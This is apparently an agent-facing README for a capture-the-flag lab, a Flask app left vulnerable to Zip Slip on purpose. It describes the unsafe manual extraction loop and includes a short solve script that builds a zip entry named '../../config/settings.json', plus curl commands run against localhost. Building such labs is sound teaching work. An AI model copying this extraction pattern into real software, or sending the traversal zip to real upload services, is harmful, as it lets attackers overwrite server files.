<!-- Parent: ../AGENTS.md -->
<!-- Generated: 2026-07-30 -->

# ZIPSLIP-High

## Purpose
A Flask app ("Zip Slip Lab - High") with a "theme package" zip-upload feature. `/upload` manually iterates each zip member and writes it via plain `os.path.join(extract_dir, member.filename)` — bypassing `zipfile`'s own safe `extract()`/`extractall()` (which strip `..` path segments) — so a crafted zip entry named e.g. `../../config/settings.json` writes outside the intended per-upload extraction directory. `/debug` re-reads `config/settings.json` fresh on every request and returns the flag once `debug` is `true`, which the player achieves by overwriting that file via the zip-slip write primitive.

## Key Files
| File | Description |
|------|--------------|
| `app.py` | `/upload` (multipart) saves the upload under `themes/<uuid>/package.zip`, then for each non-directory `zipfile.ZipInfo` in the archive does `dest_path = os.path.join(extract_dir, member.filename)` + `open(dest_path, "wb")` with no path-containment check; `/debug` reads `config/settings.json` fresh each call and returns `{"debug": true, "flag": FLAG}` only if `debug` is true, else 403 |
| `Dockerfile` | `python:3.11-slim`, installs Flask, copies `app.py`/`flag.txt`, exposes port 8000, runs `python app.py` |
| `flag.txt` | The challenge flag, returned by `/debug` once `config/settings.json`'s `debug` field has been flipped to `true` via zip slip |
| `info.txt` | Korean challenge write-up: goal (zip-slip a malicious zip to flip debug mode on), difficulty (상/High), a Python `zipfile.ZipInfo`-based example for crafting the traversal entry |
| `.upload-include` | Files bundled for distribution: `app.py`, `Dockerfile` (excludes `flag.txt`) |

## For AI Agents

### Working In This Directory
**This app is intentionally vulnerable to Zip Slip.** The vulnerability is specifically that `/upload` extracts manually via `os.path.join` + `open()` instead of calling `ZipFile.extract()`/`extractall()` — **this is deliberate and was verified empirically**: Python's own `extractall()` already strips `..`/`.`/empty path segments from member names (confirmed locally against CPython 3.14 before landing on the manual-loop design), so relying on `extractall()`'s "vulnerability" would ship an unsolvable lab. Do not "simplify" `/upload` back to `zf.extractall(extract_dir)` — that silently fixes the bug and breaks the challenge. Do not add member-name validation (e.g. rejecting `..` segments, using `os.path.commonpath` containment checks) either. Only touch this code for unrelated fixes (e.g., Docker build issues) explicitly requested.

### Testing Requirements
```bash
cd ZIPSLIP-High
docker build -t zipslip-high .
docker run -p 8000:8000 zipslip-high
```
Verify the intended solve path still works:
```python
import zipfile
with zipfile.ZipFile("evil_theme.zip", "w") as zf:
    zf.writestr(zipfile.ZipInfo("../../config/settings.json"), '{"debug": true}')
```
```bash
curl http://localhost:8000/debug                                            # 403 before
curl -F "theme=@evil_theme.zip;type=application/zip" http://localhost:8000/upload
curl http://localhost:8000/debug                                            # returns flag after
```
Also delete any `themes/`/`config/` directories left over from manual local testing (outside Docker) before committing — they are runtime artifacts, not challenge content.

### Common Patterns
- Single-file Flask app (`app.py`), inline HTML f-string for `/`, listens on `0.0.0.0:8000`.
- `config/settings.json` is created with `{"debug": false}` on first run if missing (idempotent across restarts, mirroring the "safe default" pattern other labs use for their DB/state setup).

## Dependencies

### Internal
None — fully self-contained.

### External
- Base image `python:3.11-slim`; pip package `flask`; stdlib `zipfile`, `uuid`, `json`.

<!-- MANUAL: Any manually added notes below this line are preserved on regeneration -->
